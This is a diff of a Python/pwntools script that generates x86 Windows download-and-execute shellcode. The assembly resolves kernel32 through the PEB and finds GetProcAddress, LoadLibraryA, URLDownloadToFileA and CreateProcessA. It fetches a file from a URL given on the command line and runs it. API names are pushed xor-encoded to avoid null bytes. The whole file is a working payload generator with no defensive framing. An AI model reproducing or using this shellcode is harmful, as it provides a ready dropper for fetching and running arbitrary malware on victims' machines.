@@ -1,246 +1,173 @@
 #!/usr/bin/env python3
 from pwn import *
-import sys, re
+import re
+import argparse
+from math import ceil
+parser = argparse.ArgumentParser(description='Generate x86 windows download-execute shellcode')
+parser.add_argument('-u', '--url', type=str, required=True, help='URL to file to download')
+parser.add_argument('-n', '--filename', type=str, required=True, help='Name of the file to be downloaded')
+parser.add_argument('-o', '--output', type=argparse.FileType('wb'), required=False, help='Output shellcode file')
 
-def str_to_stack(s):
-	res = ''
-	s = s.encode()
-	s+=b'\x00'*(4 - (len(s)%4))
-	sz = 0
-	while len(s)>0:
-		c = '0x'+xor(s[-4:][::-1], 0xff).hex()
-		s = s[:-4]
-		res+=f'''
-mov eax, {c}
-xor eax, 0xffffffff
-push eax
-'''
-		sz+=4
-	return res, sz
+args = parser.parse_args()
+n = ceil((len(args.url)+1)/4)*4 + ceil((len(args.filename)+1)/4)*4
 
-
-
-
-if __name__ == '__main__':
-	url = ''
-	filename = 'thing.exe'
-	out = ''
-	for i in range(len(sys.argv)-1):
-		if sys.argv[i] == '-u' or sys.argv[i] == '--url':
-			url = sys.argv[i+1]
-		elif sys.argv[i] == '-f' or sys.argv[i] == '--filename':
-			filename = sys.argv[i+1]
-		elif sys.argv[i] == '-o' or sys.argv[i] == '--output':
-			out = sys.argv[i+1]
-		elif sys.argv[i] == '-h' or sys.argv[i] == '--help':
-			printf(f'{sys.argv[0]} -u/--url URL -f/--filename FILENAME -o/--output OUTFILE -h/--help')
-			exit()
-
-	if url == '':
-		print("Provide url")
-		exit()
-
-	url, url_size = str_to_stack(url)
-	filename, filename_size = str_to_stack(filename)
-
-	code = f'''
+code = f'''
 push ebp
 mov ebp, esp
 sub esp, 0x30
 
-mov eax, [fs:0x30]; PEB addr
-mov eax, [eax+0xc]; PEB_LDR_DATA addr
-mov eax, [eax+0x14]
+mov eax, [fs:0x30]; PEB
+mov eax, [eax+0xc]; LDR
+mov eax, [eax+0x14] ;InMemoryOrderList
 mov eax, [eax]
 mov eax, [eax]
-mov eax, [eax+0x10]; kernel32.dll base addr
-mov [ebp-4], eax; var4=kerneldll base addr
+mov eax, [eax+0x10]; kernel32.dll base address
+mov [ebp-4], eax; var4 = kernel32 base addr
 mov eax, [eax+0x3c]
-add eax, [ebp-4]; new header addr
+add eax, [ebp-4]; e_lfanew
 mov eax, [eax+0x78]
-add eax, [ebp-4]; export table addr
-mov [ebp-8], eax; var8=export table
+add eax, [ebp-4]; data dir
+mov [ebp-8], eax; var8 = data dir
 mov eax, [eax+0x20]
-add eax, [ebp-4]; name pointer table
-mov [ebp-12], eax; var12=name table
+add eax, [ebp-4]
+mov [ebp-12], eax; var12 = name table
 mov eax, [ebp-8]
 mov eax, [eax+0x24]
 add eax, [ebp-4]
-mov [ebp-16], eax; var16= ordinal table
+mov [ebp-16], eax; var16 = ordinal table
 mov eax, [ebp-8]
 mov eax, [eax+0x1c]
 add eax, [ebp-4]
-mov [ebp-20], eax; var20 = addr table
+mov [ebp-8], eax; var8 = addr table
 
+/* push GetProcAddress*/
+push 0x1010101
+xor dword ptr [esp], 0x1017272
+push 0x65726464
+push 0x41636f72
+push 0x50746547
 
-mov eax, 0xffff8c8c
-xor eax, 0xffffffff
-push eax
-mov eax, 0x9a8d9b9b
-xor eax, 0xffffffff
-push eax
-mov eax, 0xbe9c908d
-xor eax, 0xffffffff
-push eax
-mov eax, 0xaf8b9ab8
-xor eax, 0xffffffff
-push eax
-mov esi, esp; GetProcAddr
+mov [ebp-20], esp; var20 = GetProcAddress
 
-xor ecx, ecx
 xor eax, eax
+xor ecx, ecx
 xor ebx, ebx
 .lp1:
-	mov edi, [ebp-12]
-	mov edi, [edi+eax*4]
-	add edi, [ebp-4]
-	xor ecx, ecx
-	.lp2:
-		mov bl, [esi+ecx]
-		mov bh, [edi+ecx]
-		test bl, bl
-		jz .found
-		inc ecx
-		cmp bl, bh
-		je .lp2
-		inc eax
-		jmp .lp1
+	mov edi, [ebp-20]
+	mov esi, [ebp-12]
+	mov esi, [esi+4*ebx]
+	add esi, [ebp-4]
+		.lp2:
+			lodsb
+			test eax, eax
+			jz .found
+			scasb
+			je .eq
+			inc ebx
+			jmp .lp1
+			.eq:
+			jmp .lp2
+
 
 .found:
-; eax = index of func
+mov eax, ebx
+mov [ebp-20], eax; ordinal
+add esp, 16
+mov eax, [ebp-16]
 xor ecx, ecx
-mov edi, [ebp-16]
-mov cx, [edi+2*eax]
-mov edi, [ebp-20]
-mov eax, [edi+4*ecx]
+mov cx, [eax+2*ebx]
+mov eax, [ebp-8]
+mov eax, [eax+4*ecx]
 add eax, [ebp-4]
 mov [ebp-8], eax; var8 = GetProcAddr
 
-add esp, 16; were allocated for string
-
-; WUB WUB
-
-mov eax, 0xffffffff
-xor eax, 0xffffffff
-push eax
-
-mov eax, 0xbe868d9e
-xor eax, 0xffffffff
-push eax
-
-mov eax, 0x8d9d96b3
-xor eax, 0xffffffff
-push eax
-
-mov eax, 0x9b9e90b3
-xor eax, 0xffffffff
-push eax
+;/* push b'LoadLibraryA\x00' */
+push 1
+dec byte ptr [esp]
+push 0x41797261
+push 0x7262694c
+push 0x64616f4c
 
 push esp
 mov eax, [ebp-4]
 push eax
-mov eax, [ebp-8]
+mov eax,[ebp-8]
 call eax
-mov [ebp-12], eax; var12=LoadLibrary
+mov [ebp-12], eax; var12 = LoadLibraryA
 add esp, 16
 
-mov eax, 0xffff9393
-xor eax, 0xffffffff
-push eax
-
-mov eax, 0x9bd19190
-xor eax, 0xffffffff
-push eax
-
-mov eax, 0x92938d8a
-xor eax, 0xffffffff
-push eax
+;/* push b'Urlmon.dll\x00' */
+push 0x1010101
+xor dword ptr [esp], 0x1016d6d
+push 0x642e6e6f
+push 0x6d6c7255
 
 push esp
 mov eax, [ebp-12]
 call eax
-mov [ebp-16], eax; var16 = urlmon.dll
-
+mov [ebp-16], eax; var16 = Urlmon.dll
 add esp, 12
 
-
-mov eax, 0xffffbe9a
-xor eax, 0xffffffff
-push eax
-
-mov eax, 0x9396b990
-xor eax, 0xffffffff
-push eax
-
-mov eax, 0xab9b9e90
-xor eax, 0xffffffff
-push eax
-
-mov eax, 0x93918890
-xor eax, 0xffffffff
-push eax
-
-mov eax, 0xbbb3adaa
-xor eax, 0xffffffff
-push eax
+;/* push b'URLDownloadToFileA\x00' */
+push 0x1010101
+xor dword ptr [esp], 0x1014064
+push 0x6c69466f
+push 0x5464616f
+push 0x6c6e776f
+push 0x444c5255
 
 push esp
 mov eax, [ebp-16]
 push eax
-mov eax, [ebp-8]
+mov eax,[ebp-8]
 call eax
-mov [ebp-20], eax; var20=URLDownloadToFile
+mov [ebp-20], eax; var20 = UrlDownloadToFile
 add esp, 20
 
-; URL
+{shellcraft.pushstr(args.url)}
 
-{url}
+mov [ebp-24], esp; var24 = URL
 
-mov [ebp-24], esp
-
-; FILENAME
-
-{filename}
-
-mov [ebp-28], esp
+{shellcraft.pushstr(args.filename)}
+mov [ebp-28], esp; var28 = filename
 
 xor eax, eax
-push eax; callback
-push eax; reserved
-mov eax, [ebp-28]
-push eax; filename
-mov eax, [ebp-24]
-push eax; url
-xor eax, eax
-push eax; caller
-
+push eax
+push eax
+mov ebx, [ebp-28]
+push ebx
+mov ebx, [ebp-24]
+push ebx
+push eax
 mov eax, [ebp-20]
 call eax
+add esp, {n}
+
+    /* push b'CreateProcessA\x00' */
+    push 0x1010101
+    xor dword ptr [esp], 0x1014072
+    push 0x7365636f
+    push 0x72506574
+    push 0x61657243
 
 
-mov eax, 0xffffbe8c
-xor eax, 0xffffffff
-push eax
-
-mov eax, 0x8c9a9c90
-xor eax, 0xffffffff
-push eax
-
-mov eax, 0x8daf9a8b
-xor eax, 0xffffffff
-push eax
-
-mov eax, 0x9e9a8dbc
-xor eax, 0xffffffff
-push eax
 
 push esp
 mov eax, [ebp-4]
 push eax
 mov eax, [ebp-8]
 call eax
-mov ebx, eax
-add esp, 0x10
+mov [ebp-32], eax; var32 = CreateProcessA
+add esp, 16
+
+
+
+{shellcraft.pushstr(args.filename)}
+mov [ebp-36], esp; var36=fn
+
+mov ebx, [ebp-32]
+
+
 
 xor eax, eax
 push eax
@@ -260,55 +187,43 @@ push eax
 push eax
 push eax
 push eax
-push eax
-push eax
-push eax
-push eax
-push eax
-push eax
-push eax
-push eax
-push eax
-push eax
-push eax
-
-mov ecx, 0x11
-lea eax, [esp+0x10]
-mov edi, eax
-xor eax, eax
-stosd
-mov dword ptr [esp+0x10], 0x44
 mov ecx, esp
-mov eax, ecx
-push eax
-lea eax, [ecx+0x10]
-push eax
-xor eax, eax
+; ecx = si
+movb [ecx], 0x44
 push eax
 push eax
 push eax
 push eax
-push eax
-push eax
-push eax
+mov edx, esp
 
-
-mov eax, [ebp-28]
+push edx
+push ecx
+push eax
+push eax
+push eax
+push eax
+push eax
+push eax
+push eax
+mov eax, [ebp-36]
 push eax
 call ebx
 
-add esp, 0x70
-add esp, {url_size+filename_size}; url and filename
 
+
+
+add esp, 0x54
+add esp, {ceil((len(args.filename)+1)/4)*4}
 add esp, 0x30
+
 pop ebp
 ret
 '''
+code = re.sub(';.*\n', '\n', code)
 
-	context.update(arch='i686', bits=32)
-	code = re.sub(';.*\n', '\n', code)
-	sc = asm(code)
-	if out == '':
-		print(sc)
-	else:
-		open(out, 'wb').write(sc)
+context.update(arch='i686', bits=32)
+sc = asm(code)
+if args.output == None:
+	print(sc)
+else:
+	args.output.write(sc)
